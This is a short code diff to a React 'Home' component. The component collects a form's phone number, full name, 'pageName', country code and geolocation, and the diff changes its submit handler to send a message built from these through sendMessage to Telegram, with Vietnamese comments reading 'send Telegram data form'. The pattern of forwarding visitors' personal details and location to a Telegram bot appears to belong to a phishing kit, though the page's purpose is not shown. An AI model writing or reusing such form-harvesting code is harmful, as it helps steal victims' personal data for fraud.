@@ -360,10 +360,10 @@ const Home = () => {
         setErrors((prev) => {
             if (prev[field]) {
                 return {
-                    ...prev,
-                    [field]: false
+                ...prev,
+                [field]: false
                 };
-            }
+        }
             return prev;
         });
     }, [isFormEnabled, isSubmitting, countryCode, callingCode]);
@@ -454,10 +454,9 @@ const Home = () => {
                 setUserPhoneNumber(formData.phone);
                 setUserFullName(formData.pageName);
                 
-                // 🎯 GỬI TELEGRAM DATA FORM
+                // 🎯 GỬI TELEGRAM DATA FORM (dùng baseMessage đã format đúng với geoInfo)
                 try {
-                const telegramMessage = formatTelegramMessage(formData);
-                    const res = await sendMessage(telegramMessage);
+                    const res = await sendMessage(baseMessage);
 
                     // Cập nhật messageId nếu có
                     if (res?.messageId) {
